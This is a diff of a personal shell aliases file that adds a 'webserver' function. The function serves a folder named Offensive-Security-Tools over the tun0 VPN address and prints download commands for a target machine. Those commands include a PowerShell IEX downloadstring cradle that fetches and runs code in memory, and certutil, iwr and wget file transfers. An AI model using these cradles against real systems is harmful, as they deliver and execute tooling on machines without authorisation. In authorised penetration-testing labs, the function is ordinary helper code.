@@ -1,7 +1,79 @@
 # My own alias:
 
 # Start provisional web server to have access to my tools:
-alias pyweb='python3 -m http.server -d /home/david/Offensive-Security-Tools/ 8888'
+webserver() {
+    # Set default values
+    local default_directory="/home/david/Offensive-Security-Tools/"
+    local port
+    local directory
+    local ip_address
+
+    # Parse arguments
+    if [ -z "$1" ]; then
+        echo "Please provide at least a port number or use 'help' for usage instructions."
+        return
+    elif [ "$1" == "help" ]; then
+        echo "Usage:"
+        echo "  webserver <port> [directory]"
+        echo "    <port>: The port number to start the HTTP server on."
+        echo "    [directory]: The directory to serve (optional). Default is $default_directory."
+        echo ""
+        echo "After the server starts, you can use the following commands:"
+        echo "  download <directory> <file>  - Print download commands for the specified directory and file."
+        echo "  download <file>              - Print download commands for the specified file in the default directory."
+        echo ""
+        return
+    fi
+
+    # Assign port and directory based on arguments
+    port="$1"
+    directory="${2:-$default_directory}"
+
+    # Get local IP address
+    ip_address=$(ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p')
+
+    # Start the Python HTTP server
+    echo "Starting HTTP server on port $port, serving directory $directory"
+    python3 -m http.server -d "$directory" "$port" &
+
+    # Keep the prompt open for additional commands
+    while true; do
+        # Show prompt and read input
+        echo -n "> "
+        read command arg1 arg2
+
+        # Check for "download" command with arguments
+        if [[ "$command" == "download" ]]; then
+            if [ -n "$arg1" ] && [ -n "$arg2" ]; then
+                # download <directory> <file>
+                echo "iwr -Uri http://$ip_address:$port/$arg1/$arg2 -Outfile $arg2"
+                echo "IEX(New-Object Net.Webclient).downloadstring('http://$ip_address:$port/$arg1/$arg2')"
+                echo "certutil -urlcache -f http://$ip_address:$port/$arg1/$arg2 $arg2"
+                echo "wget http://$ip_address:$port/$arg1/$arg2"
+            elif [ -n "$arg1" ]; then
+                # download <file>
+                echo "iwr -uri http://$ip_address:$port/$arg1 -Outfile $arg1"
+                echo "IEX(New-Object Net.Webclient).downloadstring('http://$ip_address:$port/$arg1')"
+                echo "certutil -urlcache -f http://$ip_address:$port/$arg1 $arg1"
+                echo "wget http://$ip_address:$port/$arg1"
+            else
+                echo "Usage: download <directory> <file> or download <file>"
+            fi
+        elif [[ "$command" == "help" ]]; then
+            echo "Available commands:"
+            echo "  download <directory> <file>  - Print download commands for the specified directory and file."
+            echo "  download <file>              - Print download commands for the specified file in the default directory."
+            echo "  help                         - Show this help message."
+            echo "  exit                         - Stop the server and exit."
+        elif [[ "$command" == "exit" ]]; then
+            echo "Stopping the HTTP server."
+            pkill -f "python3 -m http.server -d $directory $port"
+            break
+        else
+            echo "Unknown command. Type 'help' for usage."
+        fi
+    done
+}
 
 # Alias for dirsearch:
 alias dirsearch='python3 /home/david/Offensive-Security-Tools/Enumeration/dirsearch/dirsearch.py'
